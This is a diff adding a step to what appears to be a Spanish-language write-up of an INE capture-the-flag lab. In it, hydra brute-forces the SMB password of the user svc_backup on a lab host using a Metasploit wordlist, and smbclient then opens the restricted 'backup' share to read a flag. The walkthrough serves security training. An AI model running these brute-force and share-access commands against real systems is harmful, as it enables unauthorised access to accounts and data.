@@ -83,7 +83,21 @@ root@ine# smbclient //target1.ine.local/public -N
 
 > Not everything on the host is public. One share is reserved for a specific account. Between what the management layer told you and what the file services confirm, you know who that account is - now find a way to authenticate as them and read the restricted material. It also tells you where to go next.
 
+Usamos hydra para obtener las credenciales del usuario que hemos encontrado antes.
 
+```console
+root@ine# hydra -l svc_backup -P /usr/share/wordlists/metasploit/unix_passwords.txt target1.ine.local smb 
+```
+
+![hydra](img/hydra.png)
+
+Nos conectamos al recurso privado `backup` para obtener la flag
+
+```console
+root@ine# smbclient //target1.ine.local/backup -U svc_backup
+```
+
+![flag4](img/flag4.png)
 
 ## Task 5: Reach the internal file server
 
